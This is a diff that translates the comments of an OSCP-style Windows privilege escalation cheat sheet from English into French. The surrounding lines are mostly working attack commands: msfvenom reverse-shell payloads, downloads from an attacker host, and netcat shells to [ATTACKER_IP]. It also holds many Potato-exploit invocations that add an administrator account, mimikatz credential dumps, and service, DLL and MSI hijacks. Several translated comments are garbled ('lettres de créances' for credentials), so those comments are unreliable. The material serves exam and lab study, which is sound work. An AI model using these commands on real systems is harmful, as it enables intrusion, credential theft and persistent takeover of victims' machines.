@@ -191,7 +191,7 @@ $PSVersionTable.PSVersion
 ```powershell
 Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
 
-# Other good foder to heck for things are the web root folders, either Windows or Linux, for example in Windows (C:\inetpub\wwwroot) some config files could have hardcoded strings.
+# D'autres bons foder pour les choses sont les dossiers web root, Windows ou Linux, par exemple dans Windows (C:\inetpub\wwwroot) certains fichiers de configuration pourraient avoir des chaînes codées en dur.
 ```
 
 
@@ -241,7 +241,7 @@ Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
 
 
 ```powershell
-# Replace [Domain\Username] with the target username (e.g., backupadmin). You will be prompted to enter the password for the specified user.
+# Remplacer [Domain\Username] par le nom d'utilisateur cible (par exemple, backupadmin). Vous serez invité à saisir le mot de passe de l'utilisateur spécifié.
 runas /user:[Domain\Username] cmd
 ```
 
@@ -289,7 +289,7 @@ whoami /priv
 ```
 
 
-### Enable All Tokens
+### Activer tous les jetons
 
 
 
@@ -909,16 +909,16 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 
 
 ```powershell
-# Basic Usage
+# Utilisation de base
 ./FullPowers.exe
 
-# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)
+# Essayer d'obtenir un ensemble étendu de privilèges (faible échec avec NETWORK SERVICE)
 ./FullPowers.exe -x
 
-# Specify a command line to run
+# Spécifier une ligne de commande à exécuter
 ./FullPowers.exe -c "powershell -ep Bypass"
 
-# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)
+# Démarrer un shell vers la machine de l'agresseur (exige que vous ameniez auparavant Netcat à la victime)
 ./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z
 ```
 
@@ -950,7 +950,7 @@ whoami /priv
 <p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
-# Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
+# Conseil: Recherchez des services avec des chemins en dehors de `system32` ou d'autres endroits inattendus.; essayez de trouver cette chose qui semble déplacée.
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
 ```
 
@@ -994,10 +994,10 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
-# For 64-bit executable
+# Pour exécutable 64 bits
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
 
-# For 32-bit executable
+# Pour exécutable 32 bits
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
 ```
 
@@ -1009,7 +1009,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -
 <p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
-# Remember to run the HTTP server on your Kali to be able to bring the binary.
+# N'oubliez pas d'exécuter le serveur HTTP sur votre Kali pour pouvoir apporter le binaire.
 iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe
 
 move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"
@@ -1040,7 +1040,7 @@ sc.exe start <ServiceName>
 <p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
 
 ```powershell
-# First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
+# Première vérification des privilèges de redémarrage : SeShutdownPrivilege doit être assigné et activé.
 whoami /priv
 
 # Perform the restart
@@ -1093,7 +1093,7 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Objec
 
 
 ```powershell
-# List service dependencies
+# Dépendances des services de la liste
 Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
 ```
 
@@ -1101,7 +1101,7 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServi
 <p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
-# Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
+# Certains services utilisent des fichiers de configuration qui peuvent être détournés de façon similaire aux binaires de service. Exemple : Vérification des autorisations dans un fichier de configuration
 icacls "C:\Path\To\Service\ConfigFile.ini"
 ```
 
@@ -1117,9 +1117,9 @@ strings [downloaded_binary]
 
 flare-floss [downloaded_binary]
 
-# Use dnSpy if you know that the binary was built using .NET.
+# Utilisez dnSpy si vous savez que le binaire a été construit en utilisant .NET.
 
-# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).
+# Vous pouvez également utiliser des outils tels que PEiD, IDA Pro, ou Ghidra pour analyser le binaire (ce n'est pas recommandé parce que l'examen n'est généralement pas aussi complexe et vous pourriez aller dans un trou de lapin).
 ```
 
 
@@ -1133,7 +1133,7 @@ Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
 
 
 ```powershell
-# Check for system update settings that might revert changes
+# Vérifier les paramètres de mise à jour du système qui pourraient revenir aux modifications
 Get-WindowsUpdateLog
 ```
 
@@ -1144,16 +1144,8 @@ Get-WindowsUpdateLog
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32</code></p>
 
 
-```text
-C:\Windows\System32\System
-```
-
-
-```text
-C:\Windows
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows\System32\System</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Windows</code></p>
 **Paramètres et repères :**
 `PATH` · `ProcMon` · `depends.exe`  
 
@@ -1161,7 +1153,7 @@ C:\Windows
 <p class="oscp-command-note">Examiner les propriétés CIM du système.</p>
 
 ```powershell
-# List running services and their executable paths
+# Lister les services en cours d'exécution et leurs chemins exécutables
 Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
@@ -1173,7 +1165,7 @@ Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-
 
 
 ```powershell
-# Display the PATH environment variable
+# Affiche la variable d'environnement PATH
 $env:path
 ```
 
@@ -1209,10 +1201,10 @@ x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
 
 ```bash
-# For 64-bit DLL
+# Pour 64 bits DLL
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
 
-# For 32-bit DLL
+# Pour DLL 32 bits
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
 ```
 
@@ -1224,15 +1216,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Chargement de DLL par un service ».</p>
 
 ```powershell
-# Bring the file from your Kali using an HTTP server
+# Apportez le fichier de votre Kali en utilisant un serveur HTTP
 
 # Move the original DLL (back it up if necessary)
 move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"
 
-# Replace it with your malicious DLL
+# Remplacez-le par votre DLL malveillant
 move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"
 
-# Restart the service
+# Redémarrer le service
 Restart-Service -Name "[serviceToHijack]"
 ```
 
@@ -1240,10 +1232,10 @@ Restart-Service -Name "[serviceToHijack]"
 <p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>
 
 ```powershell
-# List users to check if the new user was added
+# Lister les utilisateurs pour vérifier si le nouvel utilisateur a été ajouté
 net user
 
-# List local administrators to verify if the new user is an admin
+# Lister les administrateurs locaux pour vérifier si le nouvel utilisateur est un administrateur
 net localgroup administrators
 ```
 
@@ -1251,7 +1243,7 @@ net localgroup administrators
 
 
 ```powershell
-# Display the PATH environment variable
+# Affiche la variable d'environnement PATH
 $env:path
 ```
 
@@ -1269,11 +1261,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
 
 
-```text
-C:\Program Files\MyApp\app.exe
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
 **Paramètres et repères :**
 `.exe`  
 
@@ -1281,21 +1269,9 @@ C:\Program Files\MyApp\app.exe
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program.exe</code></p>
 
 
-```text
-C:\Program Files\MyApp.exe
-```
-
-
-```text
-C:\Program Files\MyApp\app.exe
-```
-
-
-```text
-C:\Program Files\
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp.exe</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program Files\</code></p>
 **Paramètres et repères :**
 `app.exe`  
 
@@ -1303,11 +1279,7 @@ C:\Program Files\
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\ExampleApp\ExampleService.exe</code></p>
 
 
-```text
-C:\Program.exe
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program.exe</code></p>
 <p class="oscp-command-note">Vérifier les permissions NTFS.</p>
 
 ```powershell
@@ -1318,14 +1290,14 @@ icacls "<PathToDirectory>"
 <p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
 
 ```powershell
-# Download PowerUp script
+# Télécharger le script PowerUp
 iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1
 
-# Bypass execution policy and run the script
+# Politique d'exécution du contournement et exécuter le script
 powershell -ep bypass
 . .\PowerUp.ps1
 
-# List unquoted service paths
+# Liste des chemins de service non cités
 Get-UnquotedService
 ```
 
@@ -1333,21 +1305,21 @@ Get-UnquotedService
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Chemins de services sans guillemets ».</p>
 
 ```powershell
-# Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.
+# Créer le binaire à partir de Kali, peut être n'importe quel programme, par exemple un shell inverse, ou un programme qui ajoute un nouvel utilisateur.
 
-# Replace service binary with malicious executable (Manually)
+# Remplacer binaire de service par exécutable malveillant (Manuel)
 copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"
 
-# Replace service binary with malicious executable (with PowerUp)
+# Remplacer le binaire de service par un exécutable malveillant (avec PowerUp)
 Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'
 
-# Restart the service
+# Redémarrer le service
 Restart-Service <ServiceName>
 
-# Verify the service status
+# Vérifier l'état du service
 Get-Service -Name '<ServiceName>'
 
-# Check event logs for service-related events
+# Vérifiez les journaux des événements liés au service
 Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
 ```
 
@@ -1388,7 +1360,7 @@ move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
 ```bash
 netstat -ano
 
-# Example output:
+# Exemple de sortie :
 Proto  Local address      Remote address     State        PID
 tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       -
 tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       -
@@ -1404,7 +1376,7 @@ udp    192.168.1.9:500    0.0.0.0:*                       -
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-### Using Findstr
+### Utilisation de Findstr
 
 
 
@@ -1437,7 +1409,7 @@ findstr /spin "password" *.*
 ```
 
 
-### Check Specific Files
+### Vérifier les fichiers spécifiques
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « Check Specific Files ».</p>
@@ -1474,11 +1446,7 @@ dir c:\ /s /b | findstr /si *vnc.ini
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\SAM</code></p>
 
 
-```text
-C:\windows.old\Windows\System32\SAM
-```
-
-
+<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\windows.old\Windows\System32\SAM</code></p>
 **Paramètres et repères :**
 `impacket-tool`  
 
@@ -1547,7 +1515,7 @@ mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
 ```
 
 
-### Dumping SECURITY Hive for LSA Secrets & Cached Credentials
+### Dumping SECURITY Plongée pour les secrets et les lettres de créances LSA
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1578,7 +1546,7 @@ mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
 ```
 
 
-### Extracting User-Specific Credentials from NTUSER.dat
+### Extraire des lettres de créances spécifiques à l'utilisateur de NTUSER.dat
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1597,7 +1565,7 @@ reg load hku\TempHive <path_to_ntuser.dat>
 ```
 
 
-### General Volume Shadow Copy Access
+### Accès à la copie d'ombre de volume général
 
 
 
@@ -1623,16 +1591,16 @@ Observer les permissions et la configuration de Windows.
 `HKEY_LOCAL_MACHINE` · `HKEY_CURRENT_USER` · `1`  
 
 
-### How to Check for the Vulnerability
+### Comment vérifier la vulnérabilité
 
 
 <p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
 
 ```powershell
-# Check in HKEY_LOCAL_MACHINE for system-wide policy
+# Vérifier HKEY_LOCAL_MACHINE pour la politique à l'échelle du système
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 
-# Check in HKEY_CURRENT_USER for user-specific policy
+# Vérifiez dans HKEY_CURRENT_USER pour la politique spécifique à l'utilisateur
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
 
@@ -1661,10 +1629,10 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f m
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
 
 ```bash
-# Using Netcat
+# Utilisation de Netcat
 nc -lvnp <your_port>
 
-# Using Metasploit (forbidden in the exam)
+# Utilisation de Metasploit (interdit dans l'examen)
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/shell_reverse_tcp
@@ -1681,14 +1649,14 @@ run
 <p class="oscp-command-note">Script shell dans la rubrique « Exploiting the Vulnerability ».</p>
 
 ```bash
-# If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
+# Si la charge utile est un shell inverse, il pourrait peut-être fonctionner en exécutant simplement le .msi, essayez-le; sinon il suffit d'utiliser ci-dessous les étapes
 ./malicious.msi
 
-# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.
+# Cela installera et exécutera le MSI malveillant avec des permissions de niveau système, vous permettant d'augmenter vos privilèges.
 msiexec /quiet /qn /i malicious.msi
 
-# The /quiet and /qn flags ensure that the installation runs silently without user interaction
-# The /i flag specifies that you're installing the MSI package.
+# Les drapeaux /quiet et /qn garantissent que l'installation fonctionne silencieusement sans interaction utilisateur
+# Le drapeau /i spécifie que vous installez le paquet MSI.
 ```
 
 
@@ -1715,7 +1683,7 @@ msiexec /quiet /qn /i malicious.msi
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```powershell
-# 1. Download file from victim to local Kali, we could use techniques from section 17.
+# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.
 
 # 2. Convert .txt to .json.
 python3 peas2json.py ./winpeas_output.txt peass.json
@@ -2086,7 +2054,7 @@ DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 DCOMPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2110,7 +2078,7 @@ EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 EfsPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2134,7 +2102,7 @@ GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 GodPotato.exe -cmd "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2158,7 +2126,7 @@ HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2182,7 +2150,7 @@ JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Wi
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2206,7 +2174,7 @@ PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 PrintSpoofer.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2230,7 +2198,7 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTA
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2253,7 +2221,7 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Admi
 ```bash
 SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"
 
-# Example
+# Exemple
 SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "whoami | Set-Content C:\temp\w.log"
 ```
 
@@ -2266,10 +2234,10 @@ SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [por
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "user emma Password123 /add"
 
-# Adds the user to the Administrators group
+# Ajoute l'utilisateur au groupe Administrateurs
 SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrators emma /add"
 ```
 
@@ -2290,7 +2258,7 @@ SigmaPotato.exe --revshell [ATTACKER_IP] 4444
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 SigmaPotato.exe cmd.exe /c "net user emma Password123 /add"
 
 # Adds it as admin
@@ -2314,7 +2282,7 @@ SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
 
 
 ```bash
-# Creates the new user
+# Crée le compte utilisateur
 SweetPotato.exe -a "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2372,7 +2340,7 @@ JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Wi
 
 
 ```powershell
-# Creates the new user
+# Crée le compte utilisateur
 JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2393,7 +2361,7 @@ RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip]
 
 
 ```powershell
-# Creates the new user
+# Crée le compte utilisateur
 RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe user emma Password123 /add"
 
 # Adds it as admin
@@ -2564,10 +2532,10 @@ ren cmd.exe Utilman.exe
 <p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>
 
 ```powershell
-# Lock the computer
+# Verrouillez l'ordinateur
 Windows + L
 
-# Connect via RDP in a way that request for credentials in the Windows screen
+# Connectez-vous via RDP d'une manière qui demande des identifiants dans l'écran Windows
 rdesktop [ip]
 ```
 
